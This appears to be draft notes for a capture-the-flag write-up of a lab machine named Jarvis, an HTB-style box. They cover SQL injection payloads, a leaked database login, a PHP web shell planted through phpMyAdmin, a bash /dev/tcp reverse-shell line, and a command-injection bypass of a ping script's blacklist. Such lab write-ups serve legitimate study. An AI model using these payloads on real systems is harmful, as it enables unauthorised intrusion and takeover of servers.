Tools:
Nikto: An open source web-scanner that detects a variety of vulnerabilities
Bandit: A static analysis tool used to scan source code for vulnerabilities


Summary:
Jarvis was a machine that exercised classic exploits such as SQL injection and command injection in programs, as well as SUID abuse. Exploit begins with a port scan finding HTTP running on port 80, which is a website for booking rooms at Stark Hotel. Finding a room description page uncovers a SQL injection vulnerability, which when enumerated properly will reveal a credential set for the phpmyadmin page. Logging in allows the attacker to execute arbitrary SQL commands, which leads to a backdoor being created on a subpage of the website. 
Connecting through the page opens a reverse shell as www-data, however, this account cannot read user.txt. There is another user, pepper, that can owns it. Runnning standard enumeration commands shows that www-data can run a python program named simpler.py as the user pepper. The program takes input for a ping command and uses a blacklist to prevent execution of other commands, however, it fails to account for the use of $(/bin/bash), which allows a shell as pepper to open. The user.txt is captured. 
Finally, /bin/systemctl has a SUID bit set. By creating a reverse shell in the form of a service, systemctl can be used to start the service. By doing this, a reverse shell is returned as the root user.





SCREENSHOT OF WEBPAGE HOME

Navigating to http://10.10.10.143/ shows a hotel's homepage. Clicking on the preview images of the hotel rooms leads to /room.php.

SCREENSHOT OF ROOM.PHP

The parameter in the URL, ?cod=, points to a possible SQL injection. This is confirmed by utilizing a time-based SQL injection. Entering ?cod=1 AND if(1=1, sleep(10), false) causes the output to delay returning for 10 seconds, which confirms that the field is indeed injectable. 

SCREENSHOT OF ORDER BY THAT IS CORRECT

To begin enumerating the database, "?cod=1 ORDER BY 2" is used to test the number of columns in the table. Since the output is normal, the injection is incremented by 1, "?cod=1 ORDER BY 3". 

SCREENSHOT OF ORDER BY 8 BREAKING OUTPUT 

This is continued until "ORDER BY 8" returns nothing.  

SCREENSHOT OF UNION ALL SELECT 1 -> 7

Now, the columns which display information to the page must be isolated. Entering "?cod=0 UNION ALL SELECT 1,2,3,4,5,6,7" will cause the room page to show that columns 2, 3, 4, and 5 are reflected in the output on the page. 5 seems to be the room's image, 2 is the name of the room, 3 is the price per night, and 4 is the description of the room. Columns 1, 6, and 7 are not shown in the output. 

This means that columns 2 through 5 are usable for outputting more sensitive information. 

SCREENSHOT OF @@VERSION

Before moving further, the database version and type must be enumerated. Using @@version in one of the columns returns 10.1.37-MariaDB-0+deb9u1 as the database. 

SCREENSHOT OF SELECTING MYSQL.USER TABLE INFO

To read credentials, "?cod=0 UNION ALL SELECT 1, user, 3, password,5,6,7 FROM mysql.user" is used to output the username and hashed password of the entries in the users table. MORE HERE 

SCREENSHOT OF PHPMYADMIN LOGIN        

Nikto finds /phpmyadmin page in its scan, and DBadmin:imissyou works for logging into it. 



This can be used to log into phpmyadmin

Using â€œSQL" tab at top, enter: 
        SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/html/backdoor.php";
And execute

This places backdoor php file in web directory

Going to 10.10.10.143/backdoor.php?cmd= allows commands to be issued

bash -i >& /dev/tcp/MYIP/<PORT> 0>&1 into cmd field 

Connect back from reverse shell

User is www-data

Python script on machine is able to ping targets, but bandit identifies a vulnerability in its code in allowing input to be executed

Script has a blacklist of: &  ;  -  `  ||  | 

Trying to either a) escape/encode operator, or b) find one that the program will accept. 

Python script can be bypassed by inputting $(COMMAND) into the ping prompt. 

Command: sudo -u pepper /var/www/Admin-Utilities/simpler.py -p 
                $(/bin/bash)
                
Shell granted as pepper 

Pepper can execute /bin/systemctl with the SUID bit.
